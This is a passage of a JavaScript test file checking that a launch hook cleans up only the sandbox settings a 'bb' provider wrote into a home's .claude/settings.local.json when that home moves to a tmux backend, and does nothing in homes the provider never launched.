  const after = (await check()).result.warnings;
  assert.doesNotMatch(after[0].message, /app\.aweb\.ai/);
  assert.match(after[1].message, /^1 entry/);
});

test("the launch hook in a tmux home the provider never launched says nothing, whatever its .claude is", async (t) => {
  const { dir, home, hook } = await setup(t);
  mkdirSync(join(dir, "elsewhere"));
  symlinkSync(join(dir, "elsewhere"), join(home, ".claude"));
  const run = await hook("tmux");
  assert.equal(run.status, 0);
  assert.equal(run.stdout, "");
});

test("the launch hook on another backend removes exactly what the provider wrote: the home stopped being a provider home", async (t) => {
  const { home, launch, local, hook } = await setup(t);
  mkdirSync(join(home, ".claude"));
  writeFileSync(join(home, ".claude/settings.local.json"), JSON.stringify({ permissions: { allow: ["Bash(ls)"] }, env: { MINE: "kept" } }));
  await launch();
  assert.deepEqual(Object.keys(local()).sort(), ["env", "permissions", "sandbox"]);

  // On this provider, and in a preview, the hook changes nothing and says nothing.
  for (const run of [await hook("bb"), await hook("tmux", { OATS_LAUNCH_PREVIEW: "1" })]) {
    assert.equal(run.status, 0);
    assert.equal(run.stdout, "");
  }
  assert.ok(local().sandbox);

  const moved = await hook("tmux");
  assert.equal(moved.status, 0);
  assert.match(JSON.parse(moved.stdout).warning, /starts on tmux, no longer on bb/);
  assert.deepEqual(local(), { permissions: { allow: ["Bash(ls)"] }, env: { MINE: "kept" } });
  assert.equal(existsSync(join(home, ".oats-bb-sandbox.json")), false);
  assert.equal(existsSync(join(home, ".oats-bb/launch-env.json")), false);
  // A second start on tmux finds nothing of the provider's, and is silent.
  assert.equal((await hook("tmux")).stdout, "");
});

test("the launch hook in a home the provider never launched does nothing", async (t) => {
  const { home, hook } = await setup(t);
  const run = await hook("tmux");
  assert.equal(run.status, 0);
  assert.equal(run.stdout, "");
  assert.equal(existsSync(join(home, ".claude")), false);
  assert.equal((await runBin(["launch-hook"], { env: { OATS_BACKEND: "tmux" } })).status, 2);
});
